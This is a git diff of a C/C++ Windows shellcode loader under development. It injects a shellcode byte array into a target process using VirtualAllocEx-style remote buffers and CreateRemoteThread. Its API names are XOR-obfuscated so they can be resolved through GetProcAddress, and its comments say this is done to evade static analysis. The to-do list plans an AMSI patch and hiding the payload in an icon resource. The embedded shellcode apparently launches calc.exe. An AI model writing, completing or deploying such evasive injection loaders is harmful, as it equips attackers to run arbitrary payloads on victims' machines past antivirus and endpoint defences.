@@ -1,6 +1,6 @@
 #include <windows.h>
 #define TH32CS_SNAPPROCESS 0x00000002 //Used by CreateToolhelp32Snapshot.
-#define REMOTE_MEM_BUFF_SIZE 6969
+#define REMOTE_MEM_BUFF_SIZE 90969
 #include <stdlib.h>
 #include <stdio.h>
 #define FAVICON_ICO 
@@ -8,29 +8,19 @@
 //ico for shellcode
 
 /*
-To Do
-			Immediately required for base functionality
-	
-	[X] Get PROCESSENTRY, and Process32First to work properly. I am guessing its PROCESSENTRY struct causing issues.
-			Solved, by changing the Macro code from 0x00000010 to 0x00000002... That was it. I was providing the incorrect macro.
-	[X] Iterate over Snapshot using Process32First/Next, and find a desired process PID by strcmping a provided proc name.
-	[ON HOLD] Process name should be XOR'd array.
-	[] ProcHandle to the target process.
-	[?] VirtualAllocEx
-	[?] WriteProcssMemory (write to remote buffer)
-	[?]CreateRemoteThread
-	[] Implement indirect syscall to CreateRemoteThread
-
-			
+To Do	
 			Bugs
 	[] CreateToolhelp32Snapshot doesnt seem to work with GetProcAddress when provided in any way other than a string literal??
 	[] VirtualProtectEx doesnt seem to work with GetProcAddress when provided in any way other than when I provide VirtualProtectEx as a string literal
 	[] Notepad.exe is deXOR'd into notepad.bfl. This obviously is preventing implementation of XOR functionality into the strcmpiA function.
-		
+	[]Decode shellcode once it is injected into remote buffer
+
 
 			Later 
-[] Base64 encode/decode
-[] Put shellcode into FAVICON_ICO .ico file, so payload is in the .rsrc section.
+	[] Base64 encode/decode
+	[] Put shellcode into FAVICON_ICO .ico file, so payload is in the .rsrc section.
+	[] AMSI patch or some other patching method implemented into the program.
+
 */
 
 
@@ -60,7 +50,6 @@ unsigned char shellcode[] = { //Payload we want to execute.
   0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 
 };
 size_t shellcode_length = sizeof(shellcode);
-
 
 //XOR encoded uchar arrays that contain the names of each function we are passing to GetProcAddress, for our indirect syscall method
 unsigned char kernel[] = { 0x8, 0xb, 0x14, 0x24, 0x10, 0x25, 0x52, 0x54, 0x6a, 0x34, 0x14, 0x28 }; //kernel32.dll is not a funct, but we need to specify a module for GetProcAddress, kernel32.dll is the relevant module of all below XOR'd functions.
@@ -188,12 +177,10 @@ typedef HANDLE(WINAPI* functOpenProcess)(
 	_In_ DWORD dwProcessId
 );
 
-//CreateRemoteThread 
 
 
 
-
-char XORKey[] = "CnfJuIafDPxDnFtDShjVKDpaqmfsrdRkuoIGfZFhIqUjLomBlNBgNGfvpIuth"; //XOR Key, feel free to change this before each compile to evade static analysis
+char XORKey[] = "CnfJuIafDPxDnFtDShjVKDpaqmfsrdRkuoIGfZFhIqUjLomBlNBgNGfvpIuth"; //XOR Key, feel free to change this before each compile to hopefully evade some static analysis
 size_t XORKey_length = sizeof(XORKey);
 
 
@@ -255,6 +242,9 @@ int main()
 	HANDLE targetProc{};
 	LPVOID remMemoryBuffer =NULL;
 	DWORD oldProtectValue;
+
+
+	//Initializing function pointer values
 
 		pVirtualAlloc = (functVirtualAlloc)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(virAlloc, sizeof(virAlloc), XORKey, XORKey_length)); //point our function pointer to starting code of VirtualAlloc
 	if (pVirtualAlloc == NULL)
@@ -357,32 +347,34 @@ int main()
 
 
 
-	memoryBuffer = pVirtualAlloc(0, 40096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	PROCESSENTRY32W test;
+	// The below code provides the actual functionality, it uses the now established function pointers to make indirect syscalls.
+
+
+
+	memoryBuffer = pVirtualAlloc(0, 40096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); //Create local buffer 
+	printf("pointer to mem: %p \n", memoryBuffer); //Quality of life print, for debugging.
+	pRtlMoveMemory(memoryBuffer, shellcode, shellcode_length); //Copy the shellcode uchar array into the local buffer. 
+
+
+
+
+
+	PROCESSENTRY32W test; //initialize PROCESSENTRY32 struct for the process enumeration to be stored for checking during each loop of PROCESS32Next. 
 	test.dwSize = sizeof(PROCESSENTRY32W);
 
-
-	printf("pointer to mem: %p \n", memoryBuffer);
-
-	pRtlMoveMemory(memoryBuffer, shellcode, shellcode_length);
-
-	HANDLE snapshot = pCreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	if (snapshot == NULL)
+	HANDLE snapshot = pCreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0); //Snapshots the state of all running processes for our enumeration.
+	if (snapshot == NULL) 
 	{
-		printf("snapshot is null \n");
+		printf("err: snapshot is null \n");
+		printf("err: %d \n", GetLastError());
 	}
 	else
 	{
-		printf("err: %d \n", GetLastError());
-		printf("snapshot at 0x%p \n", snapshot);
+		printf("snapshot at 0x%p \n", snapshot); //Quality of life print, for debugging.
 	}
 
 
-
-		//testing
-
-	
-	BOOL firstProcessIsInBuff = pProcess32First(snapshot,&test);
+	BOOL firstProcessIsInBuff = pProcess32First(snapshot,&test); 
 	if (firstProcessIsInBuff == FALSE)
 	{
 		printf("firstProcessIsInBuff FAILED \n");
@@ -444,6 +436,8 @@ int main()
 
 		if (isExec == TRUE)
 		{
+
+
 			HANDLE RemoteThread = pCreateRemoteThread(targetProc, NULL, 0, (LPTHREAD_START_ROUTINE)remMemoryBuffer, 0, NULL, NULL);
 			printf("Remote thread status %p \n", RemoteThread);
 			WaitForSingleObject(RemoteThread, NULL);
